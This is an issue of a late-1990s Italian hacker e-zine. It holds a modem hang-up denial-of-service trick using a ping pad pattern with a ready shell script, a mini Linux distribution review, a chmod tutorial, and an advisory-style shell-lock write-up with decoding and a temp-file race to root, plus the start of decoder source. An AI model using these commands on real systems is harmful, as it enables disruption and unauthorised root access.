NeoGmc Stormolo En|gma e a tutti gli altri...
Un GRANDISSIMO GREETZ a: ATZer0 e A-SyNcHr0
------------------------------------------------------------------------
Sto documento e' leggibile duplicabile stampabile e utilizzabile kome
cartaigenica solo nei termini del 
TickeTWare: ossia siete obbligati a pagarmi un bijetto del treno per
andare a trovare la mia Cucciolotta ;))))))))))))). Scroccone RuleZZ
------------------------------------------------------------------------
Nota l'hping non l'ho inventato io e non mi prendo nessun merito
non so ki l'ha skoperto e non me ne frega nulla qui' spiego solo kome
Funzika
------------------------------------------------------------------------
Basta con le Puttanate e partiamo all'attacco [ora mi menerete perke' ho
skritto 25 mega di puttanate e la roba interessante sara' dolo 2 righe
;))))]
Allora:
I modem rispondono ai comandi AT... se da terminale tu mandi al modem un
ATDT166123456 dopo poki minuti la tua bolletta arrivera' alle stelle....
Quando [tanto tempo fa] si usavano le BBS tutti sapevano ke se volevi
hanguppare il modem via software dovevi mandargli il famoso "+++" ke lo
riportava in condizione di interpretare i comandi ke gli mandavi kome AT
command e non come dati da inviare al computer remoto...
con l'avvento di internet e di WinZukkaFredda si e' persa la sana
abitudine di dialogare kol modem a "mano"... brutta storia!
Komunque l'idea del Hping sarebbe questa: se io mando a un tizio un +++
seguito da un ATH0(AT command per l'hangup) al tipo gli si resetta il
modem... MEGLIO DI UN DOS!!!!
ora il problema e': se il "+++ATH0" lo mando in un pakketto tcp/ip il
modem se ne frega... altrimenti ogni volta ke ci guardiamo una pagina web
kon su skritto +++ATH0 kadremmo!!!!! UAUAUAUUAUAU
Ma sembra ke il protokulo ICMP non abbia sto controllo... ma voi direte...
i messaggi ICMP sono standard kome ce lo mettiamo dentro al pakketto il
+++ATH0???? e io vi dico... PALLE c'e' un'opzione troppo bella del ping del
Linux ke permette di caricare un Pattern per creare dei pakketti 
ECHO_REQUEST ... vediamo quello ke dice il man:

------------------man page---------------------------------------------
-p pattern
             You may specify up to 16 ``pad'' bytes to fill out 
             the packet you send.  
             This is useful for diagnosing data-dependent problems 
             in a network.  For example, ``-p ff'' will cause 
             the sent packet to be filled with all ones.
-----------------------------------------------------------------------
THIS IS USEFUL FOR DIAGNOSING DATA-DEPENDENT PROBLEMS IN A NETWORK.
Ceeerto ma anke per krearli!!!! infattti noi da bravi wajoni traduciamo in
HEX [man hexdump per pieta'] il nostro bel comandino e vediamo...
+++ATH0 = 2B2B2B41544830
Quanto e' carino..... allora il ping che useremo sara'

Dark_Elf:/tmp#ping lamahRompicazzo.tin.it -p 2B2B2B41544830

e vedremo... KE NON FA NA SEGA!
e vi dico anke il perke'': il modem vuole anche i caratteri cr e lf per
eseguire un AT command... indi mettiamo alla fine 0D e 0A...

Dark_Elf:/tmp#ping lamahRompicazzo.tin.it -p 2B2B2B415448300D0A

ora... sikkome imparare a memoria tutta la pattern mi appalla metto tutto
in uno shell skript...

------------------ fatti na sega qui'----------------------------
#!/bin/sh
ping $1 -p 2B2B2B415448300D0A
---------- puo' bastare... ora ripulisciti skifoso !! -----------

chmod -x hping
e poi... NON NON VE LO SPIEGO KOME USARLO SAREBBE TROPPO!!!!!!

C'ya e ricordate ke e' moooolto lamah usare dos e puttanate del genere...
P.s l'hping non funzika kon modem nuovi o patchati

DarK_Elf

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                ÷³       MINI DISTRIBUZIONI LINUX       ³÷
                ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Sono in circolazione per la rete molte distribuzioni ristrette che variano 
a seconda delle dimensioni (da 1.44 Mb a una ventina di Mb) e a seconda 
delle funzionalita'.
Con un po' di surfing e' facile capire che le mini - distribuzioni in
giro per la rete sono veramente tante. Percio' ne ho scelte otto
pressoche' a caso.
Ho scartato le distribuzioni dello stile "rescue disk" poiche'
le funzionalita' sono un po' limitate e anche perche' per questo
tipo di cose preferisco affidarmi ai dischi slackware (scaricabili dal
sito ufficiale)
Ho inoltre scartato le distribuzioni che non possiedono un vero
filesystem Linux. Infatti molte distribuzioni sono dotate di fs minix
anziche' linux.
Per chi vuole approfondire l'argomento delle mini-distribuzioni ( e magari
farsene una personalizzata) un buon punto di partenza e' AppuntiLinux dove 
e' presente un Capitolo che si intitola (se non sbaglio) nanolinux. Altre 
info si possono trovare qui: 
http://sunsite.unc.edu/LDP/HOWTO/Bootdisk-HOWTO.html 

Pronti via . . .
 . . .  ecco le mini-distribuzioni passate al setaccio:

DOSLINUX (Version 78) (2-23-99) 
X-DENU
CLIENUX kernel 2.0.35
TOMSRTBT
FLOPPYX
HAL91
LOAF 
MULINUX

D'ora in poi quando parlero' di "dos" intendo non solo l' M$
-dos ma anche freedos, drdos, pcdos, m$win in modalita' dos, ecc, ecc

DOSLINUX

Funziona in modalita' UMSDOS. Cio' significa che non e' necessaria
una partizione apposita (anche se e' possibile) ma il filesystem
viene installato su una directory della partizione dos.
L'installazione non richiede dischetti. Si installa tutto in
una directory dopo di che si riavvia il sistema e al prompt del dos
si digita "Loadlin" che carica il kernel e tutto cio' che serve.
DosLinux utilizza un filesystem standard (ext 2 ). L'installazione
iniziale richiede circa 15 Mb liberi sulla partizione dos. 
La versione del kernel "montato" e' la 2.2.1. DosLynux non
possiede un'interfaccia X windows e neanche utility per la compilazione
(gcc, g++  e compagnia bella. . ) ma, grazie alla breve ma efficace
documentazione (inglese) e' possibile in pochi minuti avere a disposizione
tutte le utility di cui si ha bisogno. I requisiti minimi di doslinux sono:
Un pc 386 o maggiore con almeno 8 MB di memoria ram e 15 Mb
liberi sul disco fisso.
Ecco cosa supporta DosLynux (o meglio il kernel compilato):

1. ISA, EISA, PCI, motherboards...
2. IDE hard drives and IDE/ATAPI cdrom drives... 
3. SCSI hard drives and cdrom drives... 
4. MCA (M)icro (C)hannel Bus Support...
5. PS/2 ESDI hard drives...
6. Non Atapi/Scsi cdrom drives... See "CDROM.DRIVERS" in modules/cdrom dir.
7. Standard floppy drives, e.g. a: b: etc...
8. Parallel port printers...
9. Serial and PS/2 mice...
10. PNP support...  
11. Non serial mice... See "NON.SERIAL.MOUSE" in modules/misc directory.
12. PCMCIA support... See "SUPPORTED.PCMCIA.CARDS" in packages dir.
13. ETHERNET cards... See "ETHERNET.CARDS" in the modules/net directory. 

Non c'e' nessuno supporto per i modem ISDN ma se ci serve
nessuno ci vieta  di ricompilare il kernel  ; )

Questa distribuzione (a mio parere) e' ottima per coloro che si
stanno avvicinando adesso adesso all'universo Linux. Certo e' che chi
viene dal mondo di M$ Winporc non si trovera' subito a suo agio! Comunque
DosLynux ha tutto cio' che serve per imparare i comandi di shell e
contiene svariati programmi quali la mitica Midnight Commander, il
browser Lynx, e tutto cio' che serve per il primo contatto con il pinguino)
Inoltre la sua dimensione (ben 12 Mb) fa ben capire che non e' stato
sacrificato quasi niente, per permettere all'utente di trovarsi subito
a suo agio . . (certo . per quanto possa essere d'agio una shell *nix)
I commenti dell'autore (anche sulla sua HomePage) sono veloci e
sbrigativi,  . . . peccato! mi sarebbe piaciuto sentire la sua!

X-DENU

Come e' facile capire dal nome X-denu e' una minidistribuzione
linux realizzata appositamente per far funzionare X senza Hard Disk. 
X-denu e' nato principalmente per passione e senza esigenze particolari.
Non e' sicuramante stato concepito per principianti perche'
l'installazione potrebbe essere addirittura piu' difficoltosa delle normali
distribuzioni.  Personalmente non ho avuto gravi problemi di installazione
anche se e' stato d'obbligo mettere mano all'Xconfig (equivalente
dell'XF86Config delle normali distribuzioni) per fare partire (in qualche
modo) X.

I requisiti minimi Hardware sono solamente un Processore 386 Sx
o superiore e 8 Mb di memoria Ram

Gli autori non promettono nessun update della distribuzione.

CLIENUX: 
monta kernel 2.0.35, la distribuzione va installata su una partizione Dos. 
Occupa 25 MegaByte. Ci sono TUTTE (intendo proprio tutte) le utility e i 
programmi che servono in consolle ma non c'e' X. Potrebbe essere una buona 
scelta per chi vuole installare Linux su un Laptop.
Per informazioni l'URL e' http://cqi.com/~humbubba

TOMSRTBT
Un ottimo disco si ripristino con un sacco di utility. Monta kernel 2.0.36 
e supporta schede NE2000 e compatibili, supplorto msdos, vfat, minix. Se 
siete alla ricerca di un buon disco di ripristino  (si' lo so che avevo 
detto di non trattare rescue disk . . . va be' e' un'eccezione) il mio 
consiglio e' quello di provare tomsrtbt. Tra la documentazione la sessione 
TODO e' molto lunga ma dalla popolarita' che questa distribuzione si e' 
conquistata posso supporre che Tomsrttb restera' sicuramente aggiornata.

Per rendere l'idea ecco qua la lista TODO

Com     TypEffPriDes
deb     e  m  2 unpacker
4M       e  l  9 more aliases, etc?
ash      b  h  4 echo won't allow both -e AND -n
ash      b  h  6 bizarre 'read' bug
ash      b  l  6 manpage omits $$, $ , etc.
ash      b  h  7 fix or doc builtin "test" bug
awks     e  m  5 clean up, do more..
awks     e  m  5 write 'strings' in awk
busybox  b  m  4 fix monadic to handle -fr
busybox  b  m  2 kill doesn't support named signals
busybox  e  h  4 hack in more stuff, revamp and redo
busybox  e  h  7 new version?
crtn.o   b  h  5 ?4-K overhead from for every program?
crunch   e  h  5 BSD program that auto-combines binaries?
cut      b  m  4 fix -b, -c N-..
dhcpd    e  h  2 make a really small one
doc      b  l  5 update manpage for (gnucpio)mt
doc      e  m  6 busybox man pages
floppy   e  h  8 mess with higher formats like 1840?
generic- e  m  8 which one?
hexedit  e  m  4 wrapper for diskediting
insmod   b  h  9 newer version failed?
isapnp   e  h  4 no
kbd      e  m  4 make keymaps with only changes
kernel   b  h  3 Try other SCSI/NIC tradeoffs
libc     e  h  9 convert to glibc6
lrp      e  m  4 crib from
md       e  m  8 check size, need
more     b  h  2 fix console bug, smooth scroll backwards
mount    e  l  3 update man pages
mount    b  h  6 -O2 breaks '-t nfs', -O1 works, why?
ntfs     e  m  4 newer version
passwd   e  m  2 crypt in awk, better fake login- see TEA
pax      e  h  3 enhance to do gnu-tar and gnu-cpio opts
pax      e  h  3 try to break, build verification suite.
pax      e  h  3 add support for SVR4 formats
pcmcia   e  m  5 cleanup, docs, trim, test
rc.      b  m  2 make prompted not hold/wait
smbfs    e  m  7 check size
sort     e  m  4 remove or replace with an awk
startup  e  h  2 test initrd, root.gz->minixfs ideas
tea      e  m  2 check this
telnet   e  m  5 improve
telnetd  e  m  5 improve
termcap  e  l  4 man page w/ setterm fake shortcuts i.e. ^V^[[?5h
termcap  b  h  7 rebuild lib
trinux   e  m  4 crib from
unpack   b  m  2 detect kernel w/o loop
wget     e  m  3 compare to snarf

Attenzione :necessita ELF.

Per finire ecco qua dove potete trovare Tomsrtb: 
http://www.toms.net

FLOPPYX: 
Derivato della distribuzione Debian. Occupa due dischi e va lanciato da dos 
con il comando loadlin Image.bz. Supporta le schede di rete 3c509, WD8003, 
SMC Ultra or DE500. Non c'e' X-window. Requisiti minimi : 486 Sx 16 Mb Ram.

HAL91: 
Facile l'installzione da linux con dd, posside le shell ash e bash, 
supporta filesystem Vfat e sono presenti utility per il collegmento in rete.

LOAF (Linux On A Floppy)                       
http://www.ecks.org/loaf

In pochi minuti e' possibile creare due floppy disk da 1.44 Mb con tutto 
cio' che serve per avviare LOAF. Non e' necessario alcun prompt di dos 
per far partire LOAF. Grazie alla formattazione non compressa dei dischi e 
al kernel un po' datato  il boot risulta rapido. Mi e' piaciuta questa 
distribuzione perche' e' trasparente. E' facilmente modificabile e 
trasformabile inoltre la documentazione compresa nel pacchetto e' 
esauriente e spiega come procedere alla ricompilazione / upgrade del kernel 
operazione necessaria per effettuare correttamente il mount di filesystem 
diversi dal linux box.
Tuttavia non manca un ottimo supporto di rete, il punto di forza di LOAF.
Le schede supportate sono:
 3c503
- 3c509/579
- 3c59x and 3c90x
- NE1000/2000 (ISA)
- NE2000 (PCI)
- EtherExpress Pro PCI 10+/100B/100+
- EtherWORKS 3 (DE203/204/205)
- WD80x3
- DECchip Tulip

Inoltre non manca il supporto per lo Zip di Iomega (ATAPI). Nelle features 
gli autori hanno aggiunto anche quello per Iomega Zip SCSI.

MULINUX
Eccola qua . .  non potevo mica dimenticarmela!
Mulinux e' un'ottima mini-distribuzione. Occupa da 1 a 3 dischetti. 
L'installazione si effettua da Dos oppure da linux. I dischetti devono 
essere di buona qualita' e privi di tracce danneggiate poiche' Mulinux 
formatta i dischi in modo da ottenere 1,7 Mb. Michele Andreoli, l'autore di 
Mulinux, e' riuscito a trascrivere un sacco di utility del linux 
"standard" per risparmiare preziosissimi Kb.
Da notare il "sendmail" che occupa proprio pochissimo. 
Molti comandi  mulinux sono semplici (ma non troppo) script che si basano 
su altri programmi. Mi spiego meglio. In mulinux esistono un tot di 
programmi base e tutti gli altri sono ricavati da questi tramite l'utilizzo 
di script. Mulinux si puo' utilizzare su dischetti, oppure si puo' clonare
su Hdd. Inoltre esiste un comodo Menu in che puo' aiutare i principianti. 
Comunque, se vi interessa clonare Mulinux, il classico e instancabile cp 
puo' bastare.
Mulinux si puo' clonare come UMSDOS (cioe' installato su una dir dos (es: 
c:\JRunner\mulinux) oppure come EXT2 (cioe' come una normale distribuzione 
linux). Questo modo occupa circa 10 MB. Un altro modo di clonare Mulinux 
e' il LOOP: in pratica mulinux viene clonato in un unico grande file nella 
partizione dos. 
Cio' che mi e' piaciuto di questa distribuzione e' 
1- Il kernel. E' stato compilato per far si' che tutto cio' che serve sia 
   caricato tramite moduli. Cio' rende Mulinux piu' leggero ed efficiente;
2- Questa distribuzione permette, al boot, di scegliere la configurazione 
   che piu' ci aggrada e salvarla come proprio profilo di modo che il 
   prossimo avvio sara' piu' veloce e meno noioso.
3- Mulinux puo' fare il boot via NFS!!

Ecco gli indirizzi:
LOAF---------------------> http://www.ecks.org/loaf
Tomsrtb-------------------> http://www.toms.net
CLIENUX --------------> http://cqi.com/~humbubba
HAL 91 ------------------> http://home.sol.no/~okolaas/
Non trovo + alcuni indirizzi! Mi spiace . . . sorry

Bene! L'articolo e' finito. La mia mail e' sempre la stessa 
(JohnnyRunner@usa.net) e in chat mi trovate sempre su
#hackernow1 

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

              ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
              ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
              ÷³   COMANDI PER LA GESTIONE DI FILESYSTEM   ³÷
              ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
              ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Ciao a tutti sono Barninga Z! e comincerei dai comandi per la gestione di
filesystems, una cosa breve, poi se c'e' tempo approfondisco.

Intanto si tenga presente che unix e' case sensitive, percio' i comandi vanno
digitati cosi' come sono scritti, senza prendersi liberta' di scambio
maiuscole/minuscole.

===============

cd - change directory

     analogo al cd del dos, ma con una differenza importante: cd senza
     argomento effettua un change dir alla home dell'utente (mentre
     in dos visualizza la dir corrente; per questo, in unix c'e' pwd)

chmod - change (file) mode

     modifica le permissions dei files. Prima di descrivere il comando, forse
     e' meglio parlare un po' delle permissions. In unix ogni l'uso che
     l'utente puo' fare di un file e' condizionato dalle permissions di
     questo. Le permissions ne determinano la leggibilita', la scrivibilita',
     l'eseguibilita'. Ogni file ha tre gruppi di permissions: il primo e'
     riferito all'owner (cioe' al suo proprietario, lo username che compare
     accanto alle permissions quando si fa ls -l), il secondo e' riferito al
     gruppo (il group name che compare accanto all'owner col comando ls -l),
     il terzo e' riferito a tutti gli altri (cioe' tutti gli users diversi
     dall'owner e non appartenenti a quel gruppo): basta ricordarsi "ugo"
     (user, group, other). Le permissions sono rappresentate con r,w,x
     (read, write, execute), percio' se le permissions visualizzate da
     ls -l per un certo file sono, ad esempio, -rwxr-xr-- significa che
     l'owner ha pieni privilegi su quel file: puo' eseguirlo, leggerne il
     contenuto, modificarlo e rimuoverlo ("w" oltre a modifica implica il
     diritto di cancellazione). Gli utenti appartenenti al gruppo possono
     solo eseguirlo e leggerlo, mentre tutti gli altri possono solo leggerlo.
     I trattini indicano l'assenza della corrispondente permission, cioe'
     della permission che dovrebbe trovarsi al loro posto. Un file su cui
     tutti possono fare tutto ha permissions -rwxrwxrwx. Il trattino in testa
     alle permissions ha un significato particolare: non indica cioe' una
     permission in senso stretto, ma una caratteristica particolare del file.
     Il trattino indica che si tratta di un file "normale". Gli altri
     caratteri sono i seguenti:
     d : e' una directory; in questo caso la permission "x" non indica
         eseguibilita', bensi' "attraversabilita'": se le permissions di una
         dir sono drwxr-xr--, gli utenti "other" possono listarne il contenuto
         (e' leggibile) ma non possono posizionarcisi con cd (non e'
         attraversabile).
     l : e' un link simbolico (cioe' un file che funge da "puntatore" ad un
         altro file)
     b : e' un block special file (device file per device a blocchi; es.:
         dischi)
     c : e' un character special file (device file per device a caratteri;
         es.: modem, terminali)
     p : e' una pipe (file per gestire la comunicazione tra processi)
     s : e' un socket (stream di dati tra processi)
     Vi sono poi permissions particolari: Setuid, Setgid e Sticky.
     Setuid, o set user-id bit, significa che quando il file viene eseguito,
     il sistema lo fa con i privilegi dell'owner (e non dell'utente che lo
     lancia): questa permission si indica con una "s" al posto della "x" nella
     terzina di permissions relativa all'owner. Percio', se un file ha
     permissions -rwsr-xr-x ed appartiene a root, se eseguto girera' come
     se fosse stato root a lanciarlo, anche se in effetti e' stato eseguito
     da un altro utente. Ovviamente si tratta di una cosa molto pericolosa,
     anche se in certi casi puo' risultare utile. Setgid indica il set
     group-id bit: vale quanto detto per il setuid, ma ovviamente con
     riferimento al gruppo. Questa permission si indica con una "s" in luogo
     della "x" nella terzina di permissions del gruppo. Lo sticky bit e'
     usato soprattutto con le directory, e indica che tutti possono creare
     in ese dei files, ma solo i rispettivi owner possono cancellarli. Si
     indica con una "t" al posto della "x" nella terzina "other". Tipico
     esempio e' la directory /tmp, che di solito ha permissions drwxrwxrwt.
     Setuid, Setgid e Sticky si indicano con una lettera maiuscola "S" o 
     "T" se la "x" sottostante non c'e'. Ad esempio, se un file ha permissions
     -rwxr-xr-x e si setta il setuid bit, le permissions diventano -rwsr-xr-x;
     se le permissions originali sono -rw-r-xr-x esse diventano -rwSr-xr-x.
     E adesso veniamo a chmod. Questo comando consente all'owner di un file di
     modificarne le permissions in due modi diversi:
     1) modo assoluto: setta le nuove permissions azzerando quelle precedenti.
        Le nuove permissions devono essere specificate in notazione ottale
     2) modo relativo: setta le nuove permissions aggiungendo o togliendo 
        privilegi a quelli precedentemente attivi; le nuove permissions devono 
        essere indicate in formato letterale
     Nel modo 1) ogni terzina di permissions e' rappresentata da 3 bit, i 
     cui corrispondenti valori ottali sono 1, 2 e 4 (la somma e' 7: ecco 
     perche' basta la notazione ottale). 1 corrisponde a x, 2 corrisponde a 
     w, 4 corrisponde a r. Percio' una permission r-x vale 4+1=5, e' un 
     calcolo di questo tipo va fatto per ogni terzina:
     Esempio: si vuole settare le permission a -rwxr-xr--: la terzina
     dell'owner, rwx, vale 1+2+4=7; la terzina del gruppo, r-x, vale 4+1=5;
     quella di other, r--, vale 4. Il valore da passare a chmod e' percio' 754
     (i valori delle terzine si accostano e non si sommano). Quindi,
     chmod 754 pippo setta a -rwxr-xr-- le permissions diel file pippo.
     Inutile dire che assenza di permissions vale 0. Con la notazione ottale,
     setiud, setgid e sticky occupano una quarta cifra (sempre in ottale) a 
     sinistra delle altre permissions: setuid vale 4, setgid vale 2, sticky 
     vale 1. Per dare a /tmp le sue permissions standard il comando sara' 
     chmod 1777 /tmp. E' forse il caso di sottolineare che in questo 
     modo, dopo il comando chmod, le permissions diventano esattamente quelle
     richieste, indipendentemente dal loro valore precedente.
     Nel modo 2), invece, si possono sommare o sottrarre permissions a 
     quelle attuali, indicando la lettera che rappresenta la permission 
     preceduta da + o da -. Le lettere valide sono r (read), w (write), x 
     (execute), s (setid), t (sticky). Percio' +rw aggiunge permissions di 
     read e write, mentre -t toglie la sticky bit permission. Per specificare 
     su quale terzina agire (user, group, other) si antepone a +/- la lettera 
     u, g, oppure o rispettivamente. Percio' il comando chmod u+wx pippo 
     aggiunge permissions di write e execute a pippo, lasciando inalterate 
     tutte le altre permissions. Si possono combinare comandi per terzine 
     diverse, separandoli con una virgola e senza frapporre spazi: chmod 
     u+wx,g-w,o+r pippo aggiunge write/exec per l'owner, toglie write al 
     gruppo e aggiunge read a other. Dato che la "s" serve sia per setuid 
     che per setgid (ecco perche' ho scritto setid, genericamente), la 
     distinzione si effettua ovviamente abbinandola a u oppure g
     (l'abbinamento a "o" non ha senso, e non produce effetti): u+s attiva
     il set user id bit, mentre g-s disattiva il set group id bit. Con la "t"
     non server specificare la terzina, perche' si applica solo a other;
     tuttavia o+t e o-t sono costrutti validi, alternativi a +t e -t.
     Ancora, si possono combinare le lettere indicative delle terzine in un
     solo comando: chmod ugo-x pippo toglie la permission di eseguibilita' a
     tutti. Il comando chmod accetta piu' di un nome di file, eventualmente
     specificati con wildcards; esempio: chmod u+x pippo pluto paper*
     Infine, chmod riconosce l'opzione -R, da specificare prima delle
     permissions, per richiedere la ricerca ricorsiva nelle sottodirectories. 
     Percio' chmod -R u+w ~zeta aggiunge la permission di write a tutti i 
     files e directories dell'albero che comincia nella home directory 
     dell'utente zeta (la ~ indica home).

              Kumasee
              Barninga Z!

     Email:   barninga@altavista.net / barninga@geocities.com

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                   UrK          UrK           
                      SHELL-LOCK 
                   UrK          UrK   
                   
Shell-lock e' un programma per linux che trasforma il codice di una shell in
un file binario. Questo programma e' molto usato nell'ambito della sicurezza
e gli hacker hanno fatto a gara per scovare dei bug nel suddetto.
Ora grazie all'aiuto di un file di Mudge dei L0pht , tentero' di spiegarvi
in cosa consistono questi bug e vi riportero' un programmino per sfruttarli
visto che permettono di ottenere l'accesso root su qualsiasi programma.

Spiegazione:

(a) Un banale meccanismo di codifica e' usato per offuscare il codice della
shell nel file binario compilato. Ognuno con i permessi di lettura al file in
questione puo' decodificare e ottenere il codice della shell originale.
Un'altra vulnerabilita' consiste quando un user puo' ottenere il codice
decodificato della shell senza decodificare il file binario.
F
(b) I venditori affermano che il programma sia utile nella creazione di binari
SUID su sistemi che che non rispettano lo script SUID ed anche per proteggerli
contro i problemi di sicurezza dello script SUID.
Cosi' quando esso produce un qualsiasi codice "compilato" che e' SUID,
permettera' ad ogni utente di eseguire ogni programma con i privilegi root. 

Esempio (a'):

[|_|R|<3S@/root] cat q.sh
#!/bin/sh
echo "ciao cazz... questo e' un test"

[|_|R|<3S@/root] shell-lock -o q q.sh

                         SHELL-LOCK(tm)      
                  Shell Script Security Software 
                     Copyright (C) 1989-1999   
                    Cactus International, Inc.
                 (Version:  2.1.1.1        7/19/99)

Converting files:  q.sh

Compiling.....DEMO Version...
Success!!

The shell script "q" has been compiled and placed in "q"
Conversion successful!!

[|_|R|<3S@/root] file q
q:     ELF 32-bit MSB executable SPARC Version 1, dynamically linked, stripped

[|_|R|<3S@/root] ./q
ciao cazz... questo e' un test

[|_|R|<3S@/root] strings ./q
(qualche cosa... non l'ascii dallo script shell)

[|_|R|<3S@/root]] ./codem -d -i ./q
#!/bin/sh
rm -f $0 2>/dev/null
echo "ciao cazz... questo e' un test"

Esempio (a''):

[|_|R|<3S@/root] temp-watch -d /var/tmp -C 'q*' -D ./ &
[1] 22971
[|_|R|<3S@/root] nice +10 ./q
ciao cazz... questo e' un test
[|_|R|<3S@/root] more q*
#!/bin/sh
rm -f $0 2>/dev/null
echo "ciao cazz... questo e' un test"

Esempio (b):

# ls -l q
-rwxr-xr-x   1 urkes    other      50753 Sep 28 14:24 q
# chown root q
# chmod 4755 q
# exit
[|_|R|<3S@/root] id
uid=789(urkes) gid=1(other)
[|_|R|<3S@/root] ls -l q
-rwsr-xr-x   1 root     other      50753 Sep 28 14:24 q
[|_|R|<3S@/root] temp-watch -X '^q*' -R /bin/sh -d /var/tmp &
[1] 23071
[|_|R|<3S@/root] nice +10 ./q
# id
uid=0(root) gid=1(other)

su shell-lock:

Il programma "shell-lock" e' usato per creare binari ELF dagli script shell.
Apparentemente chiamato compilatore degli script shell, il manuale dichiara
che il programma puo' anche nascondere il codice della shell originale quindi
non puo' ritornare attraverso l'esecuzione di stringhe(1) nel file binario.

Un po' manualistica sul programma shell-lock la trovate e vediamo qualcosa:
( http://www.cactus.com/shellock.html ):

 . Non c'e' nessuna possibilita' di conoscere i contenuti di uno script shell
   una volta che e' stato 'chiuso'. Anche se un hacker usa l'utility "strings"
   perdera' solo tempo.

 . Costruisce dei semplici script shell eseguendoli con il potere root.
   Cio' e' fatto dalla costruzione di file binari eseguibili settati uid,
   e elimina la possibilita' di ricavare la password root a molti utenti.

E dalle note della versione:

 . Robusto aumento della sicurezza. Tutti i metodi di attacco conosciuti 
   su uno script shell-locked sono stati eliminati in questa versione.

Dettagli:

Una breve decompilazione mostra che le routine di codifica e decodifica
assomigliano alle seguenti:

0x16194 <codem+56>:     inc  %i4                      Incrementa il contatore
0x16198 <codem+60>:     srl  %i4, 0x1f, %o0          {
0x1619c <codem+64>:     add  %i4, %o0, %o0           { testa se pari o dispari
0x161a0 <codem+68>:     andn  %o0, 1, %o0            { 
0x161a4 <codem+72>:     cmp  %i4, %o0                {
0x161a8 <codem+76>:     bne  0x161b8 <codem+92>      Se corrispondono
0x161ac <codem+80>:     add  %o1, 0x63, %o2          aggiunge 0x63 al valore
0x161b0 <codem+84>:     b  0x161c0 <codem+100>       altrimenti
0x161b4 <codem+88>:     ld  [ %i1 ], %o0
0x161b8 <codem+92>:     add  %o1, 0x44, %o2          aggiunge 0x44 al valore
0x161bc <codem+96>:     ld  [ %i1 ], %o0
0x161c0 <codem+100>:    deccc  %o0
0x161c4 <codem+104>:    bneg  0x16228 <codem+204>
0x161c8 <codem+108>:    st  %o0, [ %i1 ]
0x161cc <codem+112>:    ld  [ %i1 + 4 ], %o0
0x161d0 <codem+116>:    add  %o0, 1, %o1
0x161d4 <codem+120>:    st  %o1, [ %i1 + 4 ]
0x161d8 <codem+124>:    and  %o2, 0xff, %o1          e con 0xff 
0x161dc <codem+128>:    stb  %o1, [ %o0 ]            
0x161e0 <codem+132>:    ld  [ %i0 ], %o0
0x161e4 <codem+136>:    deccc  %o0

Questo e' simile al seguente codice in C:
    for (i=0; i < strlen ; i++){
        if (!(i % 2))
          outbuff[i] = (inbuff[i] + 0x44) & 0xff;
        else
          outbuff[i] = (inbuff[i] + 0x63) & 0xff;
    }

Convergendo, la decodifica sottrae 0x44 e 0x63 alternativamente.

La shell-lock quando crea il file binario "compilato" dallo script shell 
non fa nient'altro che aggiungere la linea  "rm -f $0 2>/dev/null"
allo script shell (o "unlink $ZERO ; $ZERO=ENV{'X0'};\n.\nw\nq" per uno
script perl) e codifica l'intero file. Cio' e' poi copiato nella sezione
data dello scheletro di un file binario. Il file binario, durante l'esecuzione
legge la sezione dati codificati e li scrive fuori in un file temporaneo 
(*nota: la locazione di default e' /var/tmp) e poi
esegue /bin/sh per chiamare il programma

Il primo metodo di estrazione viene usato un programma per leggere il file
binario e si esegue la sezione data attraverso la routine di decodifca

Il secondo metodo di estrazione e' usare la versione corrente di temp-watch
(che si puo' trovare presso il sito dei L0pht) per costruire una copia del
file temporaneo contenente il codice originale della shell che si crea
quando il file binario viene eseguito.

La vulnerabilita' del root SUID si trova quando si crea il file temporaneo
senza nessun permesso speciale, il file in esecuzione assume privilegi root.
Cosi', una persona puo' slinkare il file e rimpiazzarlo con un differente file
per vedere il file temporaneo. Questo e' comiuto nell'esempio precedente
con il progamma temp-watch usando argomenti specificando il rimpiazzamento del
file temporaneo con un link a /bin/sh.

Soluzione:

Se hai bisogno di uno script shell per eseguire con i privilegi root considera 
di scrivere il codice in C.
Non fate affidamento su shell-lock come meccanismo di offuscamento per
nascondere l'interno di uno script shell in file binario 'compilato'.
                                        
Codice sorgente:

---inizio temp-watch---
temp-watch puo' essere reperito presso il sito
http://www.l0pht.com/advisories/l0pht-watch.tar.gz
---fine temp-watch---

---begin codem.c---
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

void usage(char *);

int main(int argc, char *argv[]){
  int fdin, fdout;
  int strlen, i, c;
  int cryptFlag=0, decryptFlag=0,seekFlag=0;
  int seekOffset=50688;
  char *infile=NULL, *outfile=NULL;
  char inbuff[8192];
  char outbuff[8192];

